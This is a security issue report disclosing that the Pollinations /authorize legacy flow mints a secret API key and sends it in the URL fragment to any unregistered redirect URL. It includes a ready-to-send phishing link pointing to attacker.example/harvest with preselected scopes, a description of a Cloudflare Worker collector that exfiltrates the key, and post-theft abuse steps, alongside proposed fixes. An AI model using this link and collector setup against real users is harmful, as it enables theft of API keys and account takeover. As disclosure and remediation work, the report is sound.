# issue 71 — Post-issue-40 bypass: legacy `/authorize` fragment flow mints a secret `sk_` and delivers it to an **arbitrary, unregistered attacker URL** (`#api_key=…` in the fragment) — one link + one "Allow access" click on the official consent screen

**Severity: critical (direct secret API key leakage to an attacker-controlled site on the Pollinations identity provider's own consent screen; the key can carry attacker-preselected `keys`/`usage`/`profile`/`machines` account scopes and up to a URL-chosen budget/expiry; chains with issue 70 for full account persistence)**
**Status: LIVE in production, verified 2026-10-23 with an attacker-side Cloudflare Worker collector (passcode-gated `/harvest` catcher + leak panel): completing the legacy flow with `redirect_url=https://<worker>/harvest` landed the browser on the worker with `#api_key=sk_…` readable via `location.hash`**

## Summary

The fix for issue 40 (commit 5e07b12a family) hardened `/authorize` against **scheme** attacks: `parseAuthorizeRedirectUrl` now rejects URLs whose protocol the browser handles itself (`javascript:`, `data:`, `vbscript:`, `file:`, `blob:`, `about:`, `filesystem:` — `shared/auth/redirect-uri.ts:55-76`), and the consent screen renders the redirect hostname instead of echoing raw params. But the **legacy fragment flow** — `/authorize?redirect_url=…` *without* `response_type=code` — was left operating under its original trust model: **any `https://` (or `http://`) URL is accepted as the redirect target, with no client registration, no `client_id`, no allowlist match, and no server-side validation of the destination at key-mint time.** When the victim clicks "Allow access", the page:

1. mints a **secret `sk_` key** in the victim's account via `createKeyWithPermissions` → `POST /api/account/keys` (session-authenticated; the `consent: { redirectUri, redirectOrigin }` fields are merged into key metadata unvalidated, `enter.pollinations.ai/src/routes/account.ts:1781-1833`, `createdVia: "redirect-auth"`), then
2. navigates the victim's browser to the attacker's URL **with the raw key in the fragment**:

```ts
// frontend/src/components/auth/authorize.tsx:427-432  (legacy branch)
const hash = new URLSearchParams({ api_key: key });
if (state) hash.set("state", state);
url.hash = hash.toString();
window.location.href = url.toString();      // https://attacker.example/harvest#api_key=sk_…
```

Fragments are readable by any JS running on the receiving page (`location.hash`), are not stripped by browsers, and are **not sent to the victim for confirmation beyond the hostname line on the consent card**. This is the classic OAuth implicit-flow "unregistered redirect_uri" vulnerability, except the delivered artifact is not an access code but **the account's actual secret API key**.

The repo already contains the correct pattern — it is just not applied to this flow:

- `redirectUriMatchesAllowlistExact` (`shared/auth/redirect-uri.ts:43-51`) exists and is enforced **only** for the OAuth 2.1 code flow (`authorize.tsx:271-285` client-side, `src/routes/oauth.ts:122` server-side, PKCE S256 + registered client mandatory).
- The legacy flow explicitly skips it: with no `app_key` in the URL, `setRedirectValidationState("valid")` fires immediately and returns (`authorize.tsx:243-246`) — *"Without one, the consent screen falls back to the hostname display."* `canAuthorize` gates on `!isCodeFlow || redirectValidationState === "valid"` (`authorize.tsx:118-123`), so for the legacy flow **an unregistered arbitrary URL is "valid" by definition**.
- `src/routes/app-lookup.ts:94` documents the design: app-lookup does no redirect check for the no-`client_id` case; nothing downstream re-checks it either.

## Live verification (2026-10-23, attacker role only, throwaway victim account)

Attacker-side collector: a Cloudflare Worker exposing a passcode-gated dashboard, a public `/harvest` catcher (reads `location.hash`/`location.search`, POSTs them to an open `/leak` collector), and a leak panel. The legacy authorize link pointed `redirect_url` at `https://<worker-host>/harvest`.

1. Opened `https://enter.pollinations.ai/authorize?redirect_url=https%3A%2F%2F<worker-host>%2Fharvest` in a browser signed in to a throwaway Pollinations account.
2. The official consent screen rendered: **"Allow this app · Unknown app · `<worker-host>` · to access your Pollinations account."** — legitimate Pollinations branding; the only indication of the destination is the hostname line (`AppAttribution`, `app-attribution.tsx:40-49`).
3. Clicked **Allow access**.
4. The browser navigated to `https://<worker-host>/harvest#api_key=sk_…&state=…`; the catcher parsed the fragment with `URLSearchParams(location.hash)` and POSTed it to the collector.
5. The leak panel showed the full `sk_…` secret — **the victim's newly-minted API key, delivered to the attacker's origin.**

Production-bundle corroboration (independent of the repo): `https://enter.pollinations.ai/assets/authorize-CJBUoiF4.js` (the live route chunk, 7.6 KB) contains both the issue-40 scheme blocklist (`javascript:`, `vbscript:`, `about:`, `blob:`, `filesystem:`) **and** the fragment delivery — minified `URLSearchParams({api_key:z}` assigned to `url.hash` before `window.location` — with no allowlist check on the legacy branch.

Key facts established by the verification:

- No `app_key`/`client_id` is required — nothing about the attacker's site is registered with Pollinations.
- The minted key is created in the **victim's** account and appears in their Keys page (name = the redirect hostname), so revocation is possible if the victim notices — but the attacker already holds the secret.
- The consent screen's scope **toggles are attacker-preselectable via URL params** that the route accepts (`frontend/src/routes/authorize.tsx:38-101`): `scope=keys usage profile machines` (or legacy `permissions=`), `budget=<pollen>`, `expiry=<days>`, `models=<list>` flow into `getAuthorizeInitialPermissions` (`shared/auth/authorize-config.ts:66-120`); defaults are `DEFAULT_CONSENT_BUDGET = 5` pollen and `DEFAULT_CONSENT_EXPIRY_DAYS = 7`, and the requested-scope toggles render **enabled**. A victim who doesn't open "Advanced" grants whatever the attacker preselected.

## Attack (attacker-only; victim interaction = one link + one "Allow access" click)

1. Attacker deploys any static page that reads `location.hash` (worker, S3 bucket, GitHub Pages, …) at `https://attacker.example/harvest`.
2. Attacker sends one link (email, DM, QR, comment — the origin is the official `enter.pollinations.ai`, so it survives reputation filters and looks legitimate):
   `https://enter.pollinations.ai/authorize?redirect_url=https%3A%2F%2Fattacker.example%2Fharvest&scope=keys%20usage%20profile&budget=100&expiry=365`
3. Victim signs in (if needed) **on the real Pollinations consent screen** and clicks **Allow access** — the same gesture they perform for every legitimate app integration.
4. The victim's browser lands on the attacker's page with `#api_key=sk_…` in the fragment; the attacker's JS harvests it.
5. With the secret key the attacker now:
   - spends the victim's pollen/generation tier (`budget` was attacker-preselected),
   - with `scope=keys`: **administers the victim's keys** — mints a quiet backdoor child key and (with issue 70's escalation) grants it every account scope, outliving revocation of the leaked key,
   - with `scope=usage`: reads balance and account-wide usage; with `scope=profile`: reads name+email; with `scope=machines`: creates and runs billed sandboxes.
6. Bonus (same root cause): **Decline** also redirects to the attacker URL with `#error=access_denied` (`authorize.tsx:452-463`) — the victim reaches the attacker's page even if they deny, ideal for post-consent phishing ("something went wrong, try again").

## Why the issue-40 fix didn't close this

Issue 40 was fixed by blocking browser-handled schemes (`javascript:` et al.) so the *consent page itself* could no longer be turned into XSS. The fix's threat model was "don't let the redirect execute in the enter origin". The surviving flaw is one level up the classical OAuth hierarchy: **the legacy fragment flow has no redirect_uri registration at all** — it trusts any parseable web URL as a legitimate key recipient. The code comments describe this as intentional for the legacy flow ("hostname-only fallback", `authorize.tsx:120-122`, `app-lookup.ts:77`), which makes this a **design-level bypass of the fix's goal** rather than an implementation slip: the same one-click secret-key delivery that issue 40 demonstrated still exists — just to `https://attacker.example/` instead of `javascript:`.

## Fix (minimal)

Close the legacy flow's trust gap the way the code flow already does:

1. **Require a registered recipient for key delivery**: on the legacy fragment flow, only proceed to minting when the parsed redirect URL matches a registered allowlist — either a `client_id` (`app_key`) whose `redirectUris` contain it (`redirectUriMatchesAllowlist`), or an explicit user-typed/pinned destination otherwise. If no registration is present, refuse to mint and render the error locally (never redirect).
2. **Server-side enforcement at mint time** (`src/routes/account.ts` POST `/keys`): when `consent.redirectUri` is present, require a matching `consent.requestedClientId` + allowlist match (device flow: valid `user_code`) before creating the key; log/block unregistered `createdVia: "redirect-auth"` mints.
3. **Do not deliver raw secret keys via fragment at all** — deprecate the legacy flow in favor of the existing OAuth 2.1 code flow (registered client + PKCE S256 + single-use code), which the repo has already built and hardened (`oauth.ts:122`, `authorize-config.ts:82-88`). Until removal, at minimum strip `#api_key=` delivery for unregistered hosts and require an explicit user confirmation step that displays the full destination URL.
4. Deny-path parity: `handleDeny` must not redirect to an unvalidated URL either.

Cross-references: issue 40 (the original one-click ATO via `javascript:` redirect — this is its post-fix successor on the same route), issue 62 (compound XSS chain that used this same key-in-fragment delivery), issue 70 (child-key permission escalation — turns the leaked key into full account persistence), issue 61/59/53 (device-flow relatives of the same "consent delivers credentials to an attacker-chosen channel" pattern).
